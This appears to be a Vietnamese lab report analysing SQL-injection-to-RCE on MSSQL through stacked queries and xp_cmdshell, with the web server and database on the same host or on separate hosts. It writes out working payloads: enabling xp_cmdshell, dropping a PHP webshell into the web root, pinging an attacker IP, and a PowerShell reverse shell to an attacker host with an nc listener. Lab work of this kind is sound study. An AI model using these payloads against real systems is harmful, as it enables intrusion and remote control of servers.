# Task 4: Báo Cáo Phân Tích Hai Trường Hợp RCE Trên Cùng Máy Chủ / Khác Máy Chủ MSSQL (xp_cmdshell)

## 1. Phân Tích Cơ Bản \& Stacked Queries
Stacked Queries là kỹ thuật đưa nhiều câu lệnh SQL vào một dòng bằng dấu chấm phẩy `;`.
Vì sử dụng PHP PDO `sqlsrv` hoặc `db_lib`, trình điều khiển (driver) sẽ mặc định cho phép **Multiple Queries** vào trong `query()` hoặc `exec()`, một cấu hình cực nguy hiểm so với MySQL.

Trên MSSQL, có một store procedure cực mạnh: `xp_cmdshell`, cho phép gọi Command Shell (`cmd.exe`) từ DB. Nếu Database Server user gán quyền `sysadmin` (hoặc public user + gán thủ công xp_cmdshell run account), Attacker có thể RCE. 

**Payload Kích Hoạt xp_cmdshell**:
```sql
1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```
*Lý do: Bật quyền cấu hình hệ thống nâng cao, sau đó thiết lập bật xp_cmdshell, rồi áp dụng bằng RECONFIGURE.*

**Payload RCE Mẫu**:
```sql
1'; EXEC xp_cmdshell 'whoami'; --
```

## 2. Trường Hợp 1: Web \& DB Trên Cùng Server
**Thực nghiệm trên localhost:8051**:
* Phân Tích: Attacker đứng ngoài Web. Họ inject payload RCE thông qua `index.php?id=...`. Cả dịch vụ Apache và `mssql-server` cùng run chung một vùng mạng Host. Lệnh `xp_cmdshell` được Server nhận, nó đang chạy `cmd.exe` TỪ Máy MSSQL.
* RCE Hoàn Thiện: 
Vì "cùng chung server" với thư mục Web `/var/www/html/` (`htdocs`), nếu biết hoặc đoán được đường dẫn gốc (như cách dò Document Root ở Markdown kia), chúng ta có thể ghi đè một webshell (PHP, ASPX) **TRỰC TIẾP** ra thư mục của trang web.
```sql
1'; EXEC xp_cmdshell 'echo "<?php system($_GET[\"cmd\"]); ?>" > C:\inetpub\wwwroot\shell.php'; --
```
*Sau đó, chỉ cần truy cập http://localhost:8051/shell.php?cmd=dir để Execute trực tiếp qua Web mà không cần DB nữa.*

## 3. Trường Hợp 2: Web \& DB Khác Server
**Thực nghiệm trên localhost:8052 (Web) và DB Port 14332**:
* Phân Tích: Bỏ Payload RCE tương tự `1'; EXEC xp_cmdshell 'whoami'; --` vào, RCE VẪN HOẠT ĐỘNG. Tuy nhiên, `whoami` trả về user của Máy MSSQL (`mssql`). Lệnh OS lúc này được rẽ hướng sang một cỗ máy khác hoàn toàn (Server DB), và không còn liên quan gì đến thư mục Web (Apache PHP).
* Vấn Đề Thường Gặp: Máy DB không hề có Server Web (`/var/www/html/`). Nếu cố tình echo một PHP file ra vị trí giả định `C:\inetpub\wwwroot\`, Attacker sẽ vô phương truy cập file đó qua cổng `8052`. Khai thác bị đứt gánh.
* **Bắt Buộc Nhận Diện**: Lấy 1 request Ping gửi từ `xp_cmdshell 'ping attacker-IP'` và quan sát source IP tại webhook attacker. So sánh IP của `ping DB` với IP website đang bị hack. Khác IP = DB tách rời. Tránh phí sức tìm WebRoot.
* RCE Bằng Reverse Shell Thực Tế: Do OS DB có Windows, sử dụng PowerShell:
```sql
1'; EXEC master..xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''<attacker_IP>'',4444);$stream = $client.GetStream();..."';--
```
Attacker bật nc (`nc -lvnp 4444`), sau 5 giây terminal sẽ hiển thị Shell trả về. Dù DB bị giấu sau Web Server, Server MSSQL vẫn tự động mở outbound tới IP của ta (miễn là Router không chặn Outbound Internet port 4444).
